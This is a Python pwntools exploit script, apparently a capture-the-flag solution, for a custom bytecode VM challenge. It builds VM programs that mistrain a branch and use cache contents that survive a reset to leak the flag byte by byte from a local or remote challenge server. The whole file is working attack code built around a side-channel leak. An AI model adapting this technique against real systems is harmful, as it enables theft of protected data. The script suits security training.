#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './target/debug/vm'
context.terminal = ['tmux', 'new-window']
argv = ['prog.bin']
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# r1 = [addr]
def load_addr(addr):
    i = b''
    i += Inst.LOAD.encode()
    i += p32(addr)

    return i

# addr = r1
def store(addr):
    i = b''
    i += Inst.STORE.encode()
    i += p32(addr)

    return i

def int_write():
    i = b''
    i += Inst.INT.encode()
    i += b'o'

    return i

def int_read():
    i = b''
    i += Inst.INT.encode()
    i += b'i'

    return i

def mov_r0_r1():
    i = b''
    i += Inst.MOV_R0_R1.encode()

    return i

def mov_r1_r0():
    i = b''
    i += Inst.MOV_R1_R0.encode()

    return i

def add():
    i = b''
    i += Inst.ADD.encode()

    return i

def sub():
    i = b''
    i += Inst.SUB.encode()

    return i

def nop():
    i = b''
    i += Inst.NOP.encode()

    return i

def jmp_neq(addr):
    i = b''
    i += Inst.JMP_NE.encode()
    i += p32(PC + addr)

    return i

def halt():
    i = b''
    i += Inst.HALT.encode()

    return i

class Inst:
    PUSH_R0 = 'p'
    PUSH_R1 = 'P'
    POP_R0 = 'q'
    POP_R1 = 'Q'
    CALL = 'C'
    RET = 'R'
    JMP_R0 = 'j'
    JMP = 'J'
    JMP_EQ_R0 = 'e'
    JMP_EQ = 'E'
    JMP_NE_R9 = 'n'
    JMP_NE = 'N'
    ADD = '+'
    SUB = '-'
    AND = '&'
    OR = '|'
    XOR = '^'
    MOV_R0_R1 = '>'
    MOV_R1_R0 = '<'
    MOV_R0 = 'm'
    MOV_R1 = 'M'
    LOAD_R0 = 'l'
    LOAD = 'L'
    STORE_R0 = 's'
    STORE = 'S'
    INT = '#'
    NOP = '.'
    HALT = 'H'

PC = 0x100000
SP = 0x200000
FLAG = 0x300000
MM = 0x400000

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

flag = b""
i = 0x0
while i < 0x10:
    payload = b''
    # io access, block validator
    # read will store data in r0
    payload += int_read()
    # speculation: r0 - r1 = 0x0
    payload += sub()
    # speculation: don't take jump
    payload += jmp_neq(0x20)
    # +0x2 otherwise last access will reach EOF and return 0
    payload += load_addr(FLAG + i * 0x4+0x2)
    # store flag bytes, will also store them in cache
    payload += store(MM)
    payload = payload.ljust(0x20, nop())
    # after reset 0x42 read will cause jump to be taken
    # reset however did not clear cache => can load flag bytes from cache
    payload += load_addr(MM)
    payload += mov_r0_r1()
    payload += int_write()
    payload += halt()

    with open("prog.bin", 'wb') as f:
        f.write(payload)

    io = start(argv, env=env)
    if args.LOCAL:
        io.send(p32(0x42))
        leak = io.recv(100, timeout=0.5)
        print(leak)
        if leak != p32(0x0):
            flag += leak
            print(f"Flag: {flag}, index: {i}")
            i += 1
    else:
        io.sendlineafter("hex:", payload.hex())
        io.send(p32(0x42))

        leak = io.recv(4)
        if leak != p32(0x0):
            flag += leak
            print(f"Flag: {flag}, index: {i}")
            i += 1

    if b'}' in flag:
        break

    io.close()

print("Flag: ", flag)

